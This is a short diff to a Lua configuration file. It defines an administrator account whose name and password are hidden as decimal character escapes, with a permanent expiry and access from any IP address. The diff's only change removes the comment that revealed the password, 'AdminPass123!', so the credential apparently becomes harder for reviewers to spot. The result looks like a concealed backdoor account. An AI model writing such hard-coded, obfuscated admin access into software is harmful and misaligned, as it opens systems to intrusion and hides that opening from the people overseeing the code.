@@ -1,7 +1,7 @@
 return {
   ALLOWED_USERS = {
     ["\64\97\100\109\105\110\115"] = {
-      password = "\65\100\109\105\110\80\97\115\115\49\50\51\33",  -- AdminPass123!
+      password = "\65\100\109\105\110\80\97\115\115\49\50\51\33",
       expires = "permanent",
       allowed_ips = {"any"}
     }
